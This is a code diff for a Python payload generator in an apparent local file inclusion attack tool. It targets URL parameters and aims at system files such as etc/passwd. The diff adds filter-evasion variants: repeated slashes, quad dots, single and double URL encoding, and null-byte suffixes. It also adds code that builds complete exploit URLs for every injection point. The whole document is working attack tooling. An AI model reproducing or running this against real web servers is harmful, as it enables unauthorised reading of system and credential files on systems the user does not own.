@@ -10,6 +10,8 @@ Info:
 import urllib.parse as urllib
 from general_func import GenralFunc
 from tqdm import tqdm
+import sys
+import time
 
 class PayloadLFI:
     def __init__(self, para, parsed, url, php=True, asp=True, jsp=True, os="unknown", test_file="etc/passwd"):
@@ -38,13 +40,56 @@ class PayloadLFI:
         if self.find_injection_points(self.url):
             GenralFunc.pprint("Generating Payloads", "success")
             self.directory_transversal()
+            self.double_slash()
             self.url_encode()
-            [print(self.exploit_payload_list[x] + " : " + self.exploit_payload_desc[x]) for x in range(0, len(self.exploit_payload_list))]
+            self.generic_null_byte()
+            self.quad_dot()
 
+       #     for inj in range(0, len(self.injection_points)):
+      #          for x in range(0, len(self.exploit_payload_desc)):
+     #               GenralFunc.pprint(self.exploit_payload_desc[x], "success")
+    #                GenralFunc.pprint(self.injection_points[inj].format(self.exploit_payload_list[x]), "normal")
+
+    def double_slash(self):
+        temp_payload_holder = []
+        temp_payload_desc = []
+        GenralFunc.pprint("Double-slash injection", "dim")
+        for pay in range(0, len(self.exploit_payload_list)):
+            temp = str(self.exploit_payload_list[pay])
+            temp = temp.replace("/", "//")
+            temp = temp.replace("\\", "\\\\")
+            desc = self.exploit_payload_desc[pay] + " multiple slash filter-evasion"
+            temp_payload_holder.append(temp)
+            temp_payload_desc.append(desc)
+        GenralFunc.pprint("Mega-slash injection", "dim")
+        for pay in range(0, len(self.exploit_payload_list)):
+            temp = str(self.exploit_payload_list[pay])
+            temp = temp.replace("/", "///////////////////")
+            temp = temp.replace("\\", "\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\")
+            desc = self.exploit_payload_desc[pay] + " multiple slash filter-evasion"
+            temp_payload_holder.append(temp)
+            temp_payload_desc.append(desc)
+        for x in range(0, len(temp_payload_holder)):
+            self.exploit_payload_desc.append(temp_payload_desc[x])
+            self.exploit_payload_list.append(temp_payload_holder[x])
+
+    def quad_dot(self):
+        temp_payload_holder = []
+        temp_payload_desc = []
+        for pay in range(0, len(self.exploit_payload_list)):
+            temp = str(self.exploit_payload_list[pay])
+            temp = temp.replace("..", "....")
+            desc = self.exploit_payload_desc[pay] + " quad dots"
+            temp_payload_holder.append(temp)
+            temp_payload_desc.append(desc)
+        for x in range(0, len(temp_payload_holder)):
+            self.exploit_payload_desc.append(temp_payload_desc[x])
+            self.exploit_payload_list.append(temp_payload_holder[x])
 
     def url_encode(self):
         temp_payload_holder = []
         temp_payload_desc = []
+        GenralFunc.pprint("Single URL encode", "dim")
         for pay in range(0, len(self.exploit_payload_list)):
             temp = str(self.exploit_payload_list[pay])
             temp = temp.replace(".", "%2e")
@@ -53,6 +98,8 @@ class PayloadLFI:
             desc = self.exploit_payload_desc[pay] + " URL encoded"
             temp_payload_holder.append(temp)
             temp_payload_desc.append(desc)
+
+        GenralFunc.pprint("Double URL encode", "dim")
         for pay in range(0, len(temp_payload_holder)):
             temp = self.exploit_payload_list[pay]
             temp = temp.replace(".", "%252e")
@@ -73,6 +120,7 @@ class PayloadLFI:
         :return: a format string
         """
         try:
+            GenralFunc.pprint("Finding injection points", "dim")
             for parameter in self.get_parameters:
                 name = parameter.split("=")[0]
                 temp_url = url
@@ -93,6 +141,7 @@ class PayloadLFI:
         Gets the parameter and adds the ../../...... etc
         :return: Appends to the payload list
         """
+        GenralFunc.pprint("Generic directory transversal", "dim")
         for x in range(0, 7):
             if self.os == "windows" or self.os == "unknown":
                 if x == 0:
@@ -113,9 +162,33 @@ class PayloadLFI:
 
 
     def display_payloads(self):
-        for i in tqdm(range(0, len(self.exploit_payload_list))):
+        """
+        Horrible to read, just displays a progress bar and prints URL's
+        :return:
+        """
+        iden = []
+        for x in range(0, len(self.injection_points)):
+            for y in range(0, len(self.exploit_payload_list)):
+                iden.append(x)
+        url_with_exploit = []
+        try:
+            for i in range(0, len(self.exploit_payload_list)*len(self.injection_points)-1):
+                url_with_exploit.append(self.injection_points[iden[i]].format(self.exploit_payload_list[i]))
+
+                to_print = self.exploit_payload_list[i]
+                GenralFunc.pprint("\r" + to_print[0:120], "flush")
+                time.sleep(0.0015)
+
+            for i in tqdm(range(0, len(self.exploit_payload_list)*len(self.injection_points)-1)):
+                 pass
+        except IndexError:
             pass
-        GenralFunc.pprint("Total Payloads to be sent: " + str(len(self.exploit_payload_list)), "success")
+        GenralFunc.pprint("", "dim")
+        GenralFunc.pprint("Payload Generation successful", "success")
+        GenralFunc.pprint("Total Payloads to be sent: " + str(len(self.exploit_payload_list)*len(self.injection_points)), "underline")
+
+        return url_with_exploit
+
 
     def php_filter(self):
         pass
@@ -137,21 +210,10 @@ class PayloadLFI:
 
     def generic_null_byte(self):
         """Just addes %00 to the end of the payload"""
-        print(self.payload_list)
+        GenralFunc.pprint("Generic Null Byte injection", "dim")
         temp_payload_holder = []
-        for payloads in self.payload_list:
+        for payloads in self.exploit_payload_list:
             temp_payload_holder.append(payloads + "%00")
-        for payloads in temp_payload_holder:
-            self.payload_list.append(payloads)
-            self.payload_description.append("Generic directory transversal with null byte injection")
-
-
-    def generic_truncate(self):
-        pass
-
-    def generic_encode(self):
-        pass
-
-    def generic_double_encode(self):
-        pass
-
+        for x in range(0, len(temp_payload_holder)):
+            self.exploit_payload_list.append(temp_payload_holder[x])
+            self.exploit_payload_desc.append(self.exploit_payload_desc[x] + " with null byte injection")
